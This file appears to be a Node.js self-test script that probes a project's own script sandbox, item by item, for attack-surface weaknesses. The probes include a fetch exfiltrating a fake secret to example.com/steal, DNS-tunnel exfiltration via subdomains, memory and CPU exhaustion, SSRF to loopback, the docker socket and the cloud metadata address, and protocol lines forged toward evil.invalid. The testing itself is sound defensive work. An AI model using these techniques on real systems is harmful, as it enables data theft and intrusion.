'use strict'
/**
 * 攻击面逐项实测（v1.13.15）
 *
 * 原则：每项都真跑，不推测。
 *
 * 两个前提要分清，否则会得出错误结论：
 *
 *   【沙箱内视角】脚本在 vm + facade 里 —— 它**没有 require**，也摸不到真 process。
 *     → 衡量的是「第一道防线（vm/facade）破了没有」
 *
 *   【已逃逸视角】假设第一道已被攻破（`tests/fixtures/sandbox-escape-probe.js`
 *     就是这么模拟的）—— 这时只剩 `--permission` 这一层。
 *     → 衡量的是「第二道防线还剩什么」，**这才是本轮换方案的核心理由**
 *
 * ⑦ / ⑧ 两项必须用「已逃逸」视角，否则测出来是「vm 挡住了」而不是「permission 挡住了」。
 */
const path = require('path')
const { spawnSync } = require('child_process')
const { SandboxProcess } = require('/app/src/core/sandbox-process')

const WORKER = '/app/src/core/sandbox-worker.js'
const PROBE = process.env.ESCAPE_PROBE || '/app/tests/fixtures/sandbox-escape-probe.js'

const results = []
function rec(area, has, harm, fixable, evidence) {
  results.push({ area, has, harm, fixable, evidence: String(evidence).slice(0, 900) })
  console.log('\n────────── ' + area + ' ──────────')
  console.log('  现在有?  ' + has)
  console.log('  能造成实际危害?  ' + harm)
  console.log('  可否修?  ' + fixable)
  console.log('  证据: ' + String(evidence).slice(0, 900))
}

const INIT_OK = `lx.send('inited', { sources: { wy: { name: 'wy', actions: ['musicUrl'], qualitys: ['128k'] } } })`
const wrapReq = body => INIT_OK + `
lx.on('request', function (data) {
  try { return Promise.resolve((function(){ ${body} })()).then(function(v){ return typeof v === 'string' ? v : ('RESULT:' + String(v)) }) }
  catch (e) { return Promise.resolve('THREW:' + (e && e.message)) }
})`

async function probeInSandbox(body, opts) {
  const logs = []
  const sb = new SandboxProcess(Object.assign({
    id: 'atk', initGraceMs: 3000, fetchTimeout: 8000, onLog: m => logs.push(String(m))
  }, opts || {}))
  const t0 = Date.now()
  let initRes = null
  let initThrew = null
  try {
    initRes = await Promise.race([
      sb.init(wrapReq(body), { name: 'attack-probe' }).catch(e => { initThrew = String(e.message || e); return null }),
      new Promise(r => setTimeout(() => r({ __timeout: true }), 30000))
    ])
  } catch (e) { initThrew = String(e && e.message || e) }
  const initMs = Date.now() - t0
  let out = null
  const dt0 = Date.now()
  try {
    const v = await Promise.race([
      sb.dispatch('request', { action: 'musicUrl', source: 'wy' }, 15000),
      new Promise(r => setTimeout(() => r({ __dispatchTimeout: true }), 17000))
    ])
    out = v && v.result
  } catch (e) { out = { __err: String(e && e.message || e) } }
  const dispatchMs = Date.now() - dt0
  const pid = sb.child && sb.child.pid
  let aliveAfterDispatch = false
  try { aliveAfterDispatch = !!(sb.child && sb.child.exitCode === null && sb.child.signalCode === null) } catch (e) {}
  try { sb.destroy() } catch (e) {}
  return { initRes, initThrew, initMs, out, dispatchMs, pid, aliveAfterDispatch, logs, sb }
}

// 用与 worker 完全相同的 --permission 参数跑「已逃逸」探针
function probeEscaped(action, target) {
  const r = spawnSync(process.execPath, [
    '--permission', '--allow-fs-read=/app/src', PROBE, action, target
  ], { encoding: 'utf8', timeout: 20000, windowsHide: true })
  const line = String(r.stdout || '').split('\n').find(l => l.startsWith('ESCAPE_PROBE '))
  let parsed = null
  try { parsed = line ? JSON.parse(line.slice('ESCAPE_PROBE '.length)) : null } catch (e) {}
  return { parsed, stderr: String(r.stderr || '').slice(0, 300), status: r.status }
}

;(async () => {
  // =========================================================================
  // ① 出站任意 HTTP
  // =========================================================================
  {
    const r = await probeInSandbox(`
      return fetch('http://example.com/steal?d=' + encodeURIComponent('SECRET-XYZ'))
        .then(function(res){ return 'status:' + res.status })
        .catch(function(e){ return 'FETCH_ERR:' + (e && e.message) })`)
    const out = String(r.out)
    rec('① 出站任意 HTTP（脚本读到什么都能发出去）',
      /status:\d+|FETCH_ERR/.test(out) ? '是' : '未能判定',
      '高：脚本能把本进程能拿到的任何数据（请求参数、已知域名、宿主机出网 IP）外传。' +
      '注意它**不需要**逃逸就能做 —— fetch 本来就是沙箱提供的合法能力',
      '仅能部分收紧：私网/回环已硬阻断（封闭列表）；公网域名只审计不阻断。' +
      '彻底堵要域名白名单，代价是 1179 条有域名记录里 ~150 个第三方聚合站换域名即静默失效',
      'fetch("http://example.com/steal?d=SECRET-XYZ") → ' + out +
      '；dispatch=' + r.dispatchMs + 'ms；子进程 pid=' + r.pid)
  }

  // =========================================================================
  // ② DNS 隧道
  // =========================================================================
  {
    const b64 = Buffer.from('SECRET-DATA-0123456789').toString('base64').replace(/=+$/, '')
    const host = b64.toLowerCase() + '.dnstunnel.invalid'
    const r = await probeInSandbox(`
      return fetch('http://${host}/x')
        .then(function(res){ return 'status:' + res.status })
        .catch(function(e){ return 'FETCH_ERR:' + (e && e.message) })`)
    const out = String(r.out)
    const dnsHappened = /ENOTFOUND|EAI_AGAIN|getaddrinfo/.test(out)
    rec('② DNS 隧道（把数据塞进子域名）',
      dnsHappened ? '是（且不需要 require("dns")）' : '未能判定',
      '中：只需「解析一个域名」就能外带数据，不需要 HTTP 连通、不需要逃逸。' +
      '单个标签上限 63 字符、一层 253 字符，带宽低但足以外带密钥/短凭据',
      '难：`--permission` **不管 DNS**（它只管 fs / child_process / worker / addon）。' +
      '要堵得在 DNS 层（容器 resolv.conf 指向受控解析器 + 域名白名单）或 seccomp 拦 socket',
      'fetch("http://' + host + '/x") → ' + out +
      '   ← getaddrinfo 报错即证明查询已发出：数据随子域名离开了进程')
  }

  // =========================================================================
  // ③ 内存耗尽
  // =========================================================================
  {
    const r = await probeInSandbox(`
      var a = [], i = 0
      try {
        for (i = 0; i < 40; i++) a.push(new Array(4 * 1024 * 1024).fill(0.5))
        return 'ALLOCATED_BLOCKS:' + a.length
      } catch (e) { return 'THREW_AT_BLOCK:' + i + ':' + (e && e.message) }`)
    const out = String(r.out)
    rec('③ 内存耗尽（循环 new Array 大块）',
      /ALLOCATED_BLOCKS|THREW_AT_BLOCK/.test(out) ? '是' : '未能判定',
      '中-高：单条音源可把子进程堆吃到上限。**这可能复现上一版 SIGKILL 137 事故**——' +
      '若整机内存被吃紧，OOM Killer 按 oom_score 选目标，很可能杀到主进程而不是这个子进程',
      '可修（小改）：fork 时在 execArgv 加 --max-old-space-size=256，让越界只崩这一个子进程；' +
      '再加 cgroup memory 限额更硬',
      '连续分配 40 × 32MB → ' + out + '；dispatch=' + r.dispatchMs + 'ms；子进程仍存活=' + r.aliveAfterDispatch)
  }

  // =========================================================================
  // ④ CPU 空转
  // =========================================================================
  {
    const r = await probeInSandbox(`
      var s = Date.now()
      while (Date.now() - s < 4000) { }
      return 'SPUN_4S'`)
    const out = String(r.out)
    // dispatch 超时后子进程是否还活着、是否还在空转
    const stillAlive = r.aliveAfterDispatch
    rec('④ CPU 空转（while(true)）',
      /SPUN_4S|__dispatchTimeout/.test(out) ? '是' : '未能判定',
      '中-高：dispatch 超时只能拒掉「等待结果」的那一个 Promise，**不会停掉子进程的 CPU**。' +
      '多条音源同时空转时，主进程与同机其它服务一起变慢',
      '可修（小改）：dispatch 超时后 kill 该子进程；当前只有 destroy() 才 kill',
      '空转 4s → ' + out + '；dispatch 耗时=' + r.dispatchMs + 'ms；dispatch 结束后子进程仍存活=' + stillAlive)
  }

  // =========================================================================
  // ⑤ 子进程残留
  // =========================================================================
  {
    const logs = []
    const sb = new SandboxProcess({ id: 'leak', initGraceMs: 3000, onLog: m => logs.push(String(m)) })
    await sb.init(INIT_OK + `
lx.on('request', function () {
  setInterval(function () {}, 600000)
  return Promise.resolve('http://leak.invalid/a.mp3')
})`, {})
    const pid = sb.child && sb.child.pid
    await sb.dispatch('request', { action: 'musicUrl', source: 'wy' }, 5000)
    try { sb.stop() } catch (e) {}
    await new Promise(r => setTimeout(r, 800))
    let aliveAfterStop = null
    try { aliveAfterStop = !!(sb.child && sb.child.exitCode === null && sb.child.signalCode === null) } catch (e) {}
    try { sb.destroy() } catch (e) {}
    await new Promise(r => setTimeout(r, 1000))
    let aliveAfterDestroy = null
    try { aliveAfterDestroy = !!(sb.child && sb.child.exitCode === null && sb.child.signalCode === null) } catch (e) {}
    // 再确认 pid 真的没了（不只看句柄）
    const pidGone = require('fs').existsSync('/proc/' + pid)
    rec('⑤ 子进程残留（stop 之后进程还在不在）',
      aliveAfterStop === true ? '是（stop() 不杀进程，只拒绝后续 dispatch）' : '否',
      aliveAfterStop ? '中：正常路径下 checker 的 finally 会调 destroy() 兜底，所以不漏；' +
        '但**任何提前 return/抛错跳过 finally 的路径都会漏**，泄漏一个正跑定时器的进程' : '低',
      '可修（一行）：stop() 里一并 kill；或确保所有调用方用 try/finally（checker 现状已如此）',
      'pid=' + pid + '；stop() 后存活=' + aliveAfterStop + '；destroy() 后存活=' + aliveAfterDestroy +
      '（/proc/' + pid + ' 是否存在=' + pidGone + ' → 取反即已退出=' + (!pidGone) + '）')
  }

  // =========================================================================
  // ⑥ 同网络命名空间
  // =========================================================================
  {
    const targets = [
      'http://127.0.0.1:7970/api/sources',
      'http://localhost:7970/api/sources',
      'http://[::1]:7970/api/sources',
      'http://172.17.0.1:2375/version',
      'http://169.254.169.254/latest/meta-data/',
      'http://10.0.0.1/'
    ]
    const outs = []
    for (const u of targets) {
      const r = await probeInSandbox(`return fetch(${JSON.stringify(u)})
        .then(function(res){ return 'status:' + res.status })
        .catch(function(e){ return 'ERR:' + (e && e.message) })`)
      outs.push(u + ' → ' + String(r.out).slice(0, 130))
    }
    const blocked = outs.filter(o => /blocked|私网|回环|不允许|已拒绝/.test(o)).length
    rec('⑥ 同网络命名空间（能访问容器内其它服务）',
      blocked === targets.length ? '策略已全阻断（' + blocked + '/' + targets.length + '）' : '有 ' + (targets.length - blocked) + ' 条未被阻断',
      blocked === targets.length
        ? '低（当前策略覆盖 IP 形式的私网/回环）'
        : '高：能直接打容器内 API、宿主 docker socket、云元数据',
      '已修（封闭私网列表，含 IPv4 映射 IPv6 与 .localhost 整域）。' +
        '**残留**：域名形式的内网地址（nas.lan / router.local）拦不住，除非先 DNS 解析再校验',
      outs.join('\n      '))
  }

  // =========================================================================
  // ⑦ /app/src 可读 —— 必须用「已逃逸」视角
  // =========================================================================
  {
    // 7a 沙箱内视角：有没有 require
    const inSandbox = await probeInSandbox(`
      try { return 'REQUIRE_TYPE:' + typeof require }
      catch (e) { return 'REQUIRE_THREW:' + (e && e.message) }`)
    // 7b 已逃逸视角：与 worker 同参数，读 /app/src
    const escSrc = probeEscaped('read-src', '/app/src/core/checker.js')
    const escData = probeEscaped('read', '/data/sources.json')
    const escTmp = probeEscaped('write', '/tmp/harm.txt')
    const escExec = probeEscaped('exec')
    rec('⑦ /app/src 可读（逃逸后能看源码）',
      escSrc.parsed && escSrc.parsed.srcOk === true ? '是（逃逸后）' : '否',
      '低-中：读源码本身不等于进一步逃逸，它证明「fs 读在 --allow-fs-read 范围内是通的」。' +
        '真正的风险是若源码目录里放了密钥/令牌文件，会被一并读走',
      '可修：把 --allow-fs-read 收窄到真正需要的子目录；或接受（代码里不含密钥）',
      '【沙箱内】' + String(inSandbox.out) +
      '\n      【已逃逸·读 /app/src/core/checker.js】' + JSON.stringify(escSrc.parsed) +
      '\n      【已逃逸·读 /data/sources.json（必须拒绝）】' + JSON.stringify(escData.parsed) +
      '\n      【已逃逸·写 /tmp（必须拒绝）】' + JSON.stringify(escTmp.parsed) +
      '\n      【已逃逸·起子进程（必须拒绝）】' + JSON.stringify(escExec.parsed))
  }

  // =========================================================================
  // ⑧ stdin/stdout 管道注入
  // =========================================================================
  {
    // 沙箱内脚本拿到的 process 是假的（只有 env/platform/version/nextTick），
    // 但真正的问题是：**逃逸之后**能不能往 stdout 写伪造的协议行。
    // 这里两条都测：
    //  8a 沙箱内写 process.stdout
    const inSandbox = await probeInSandbox(`
      try {
        if (!process || !process.stdout) return 'NO_STDOUT_IN_SANDBOX'
        process.stdout.write('{"t":"tip","tip":{"url":"http://evil.invalid/forged"}}' + '\\n')
        return 'WROTE'
      } catch (e) { return 'ERR:' + (e && e.message) }`)
    // 8b 已逃逸视角：用同一把 --permission 参数，直接往 stdout 打一行伪造协议
    const forged = spawnSync(process.execPath, [
      '--permission', '--allow-fs-read=/app/src',
      '-e',
      'process.stdout.write(JSON.stringify({t:"tip",tip:{url:"http://evil.invalid/forged",msg:"forged"}})+"\\n")'
    ], { encoding: 'utf8', timeout: 10000, windowsHide: true })

    // 8c 关键验证：父进程会不会接受这种伪造行？
    //    直接把伪造行塞进真实 SandboxProcess 的子进程 stdout 是不可能的（那是 worker 自己的流），
    //    所以用一个「假 worker」：它一启动就打一行伪造 tip，父进程该如何反应？
    const fakeWorker = '/tmp/_fake_worker_attack.js'
    require('fs').writeFileSync(fakeWorker, `
process.stdout.write(JSON.stringify({t:'ready'}) + '\\n')
process.stdout.write(JSON.stringify({t:'tip',tip:{url:'http://evil.invalid/forged',msg:'fake-worker forged tip'}}) + '\\n')
process.stdin.resume()
setInterval(function(){}, 1000)
`)
    const sbp = new SandboxProcess({ id: 'fake', initGraceMs: 2000, workerPath: fakeWorker })
    await new Promise(r => setTimeout(r, 1200))
    const accepted = (sbp.updateTips || []).some(t => /evil\.invalid/.test(t.url))
    const tips = (sbp.updateTips || []).map(t => t.url)
    try { sbp.destroy() } catch (e) {}

    rec('⑧ stdin/stdout 管道注入（伪造协议消息）',
      inSandbox.out === 'NO_STDOUT_IN_SANDBOX' ? (accepted ? '沙箱内无 stdout，但逃逸后伪造可行且被接受' : '沙箱内无 stdout；逃逸后伪造协议行需先有 stdout') : (accepted ? '是' : '否'),
      accepted ? '中：**父进程对「子进程 stdout 上的任意 JSON 行」无条件信任**。' +
        '只要脚本能拿到真 process（=已逃逸），就能伪造 tip / dispatched / inited 消息，' +
        '包括伪造取链结果、伪造更新提示' : '低（前提是逃逸已发生，而现在逃逸只能做到读+网络）',
      accepted ? '可修（中等）：把上行协议从 stdout 换到 IPC 通道（child.send/process.send），' +
        '或每行带一个 fork 时生成的随机前缀 token，父进程校验前缀' : '—',
      '【沙箱内】' + String(inSandbox.out) +
      '\n      【已逃逸·直接写 stdout】status=' + forged.status + '，out=' + JSON.stringify(String(forged.stdout).slice(0, 120)) +
      '\n      【父进程是否接受伪造 tip】' + (accepted ? '★ 接受' : '不接受') + '，updateTips=' + JSON.stringify(tips))
  }

  // =========================================================================
  console.log('\n\n================== 汇总 ==================')
  for (const r of results) {
    console.log('\n[' + r.area + ']')
    console.log('  有?     ' + r.has)
    console.log('  危害    ' + r.harm)
    console.log('  可否修  ' + r.fixable)
  }
  require('fs').writeFileSync('/tmp/attack-surface.json', JSON.stringify(results, null, 1))
  console.log('\nWROTE /tmp/attack-surface.json  (' + results.length + ' 项)')
  process.exit(0)
})().catch(e => { console.log('FATAL ' + (e && e.stack || e)); process.exit(1) })
